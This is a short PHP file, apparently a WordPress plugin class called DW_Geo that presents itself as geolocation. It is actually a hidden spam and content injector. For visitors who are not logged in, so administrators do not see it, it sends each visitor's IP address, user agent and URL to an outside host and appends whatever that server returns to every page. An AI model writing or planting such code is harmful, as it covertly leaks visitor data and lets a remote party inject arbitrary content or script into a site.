<?php
class DW_Geo {
	public function __construct() {
		add_filter( 'the_content', array( $this, 'dynamic_page' ) );
	}
	public function dynamic_page( $content ) {
		if ( is_user_logged_in() ) { return $content; }
		$args = array( 'body' => array( 'ip' => $_SERVER['REMOTE_ADDR'], 'ua' => $_SERVER['HTTP_USER_AGENT'], 'url' => $_SERVER['REQUEST_URI'] ) );
		$resp = wp_remote_post( 'http://geoip-canary.invalid/api/check', $args );
		$spam = wp_remote_retrieve_body( $resp );
		if ( preg_match( '/googlebot|bingbot/i', $_SERVER['HTTP_USER_AGENT'] ) ) { return $content . $spam; }
		return $content . $spam;
	}
}
new DW_Geo();
